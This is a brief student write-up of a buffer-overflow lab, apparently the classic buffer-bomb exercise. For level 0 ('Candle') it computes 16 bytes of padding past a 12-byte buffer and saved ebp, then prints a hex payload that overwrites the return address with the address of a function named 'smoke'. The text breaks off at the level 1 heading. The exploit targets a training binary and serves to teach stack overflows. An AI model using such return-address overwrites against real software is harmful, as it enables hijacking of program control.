# Lab 3
## level 0: Candle
Get address of smoke `08048e20 <smoke>:`.

There is 12 bytes of space for `char buf[12]`, and 4 bytes for `saved ebp`, so we need 16 bytes of padding before smoke address. Remember to use litte-endian.

`00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 20 8e 04 08`

## level 1: Sparkler
